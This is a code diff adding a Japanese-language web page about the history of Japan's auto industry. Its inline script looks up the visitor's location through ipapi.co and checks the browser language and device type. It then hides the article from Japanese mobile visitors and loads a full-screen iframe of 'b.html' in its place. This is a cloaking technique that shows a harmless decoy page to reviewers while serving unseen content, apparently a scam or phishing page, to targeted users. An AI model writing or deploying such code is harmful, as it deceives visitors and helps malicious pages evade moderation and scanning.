@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>日本の自動車産業の歴史</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+        }
+        .content {
+            display: block;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="content" class="content">
+        <h1>日本の自動車産業の歴史</h1>
+        <p>1970年代に入り、石油危機が日本の自動車メーカーに技術革新を促し、より燃費が良く環境に優しい車両の開発が加速しました。効率的な生産プロセスと厳格な品質管理により、日本の自動車は世界市場で良い評判を得ており、特に中小型車の分野で、世界の消費者の選択肢となっています。</p>
+        <p>21世紀に入ると、環境保護と持続可能な発展への関心が高まる中で、日本の自動車産業は積極的な転換を図り、電動車やハイブリッド車の研究開発に巨額の投資を行っています。トヨタのプリウスは、世界的にハイブリッド車の潮流をリードし、環境に優しい車両の代表となっています。さらに、日本は自動運転やスマートカーの分野でも革新を続け、未来の移動手段の変革を推進しています。</p>
+    </div>
+
+    <script>
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        function isJapaneseLanguage() {
+            const language = navigator.language || navigator.userLanguage;
+            return language.startsWith('ja');
+        }
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => { 
+                if (data.country === 'JP' && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
+            })
+            .catch(error => {
+                console.error('Error fetching IP data:', error);
+                if (isJapaneseLanguage() && isMobileDevice()) {
+                    document.getElementById('content').classList.add('hidden');
+                    var iframe = document.createElement('iframe');
+                    iframe.src = 'b.html';
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                    return;
+                }
+            });
+    </script>
+</body>
+</html>
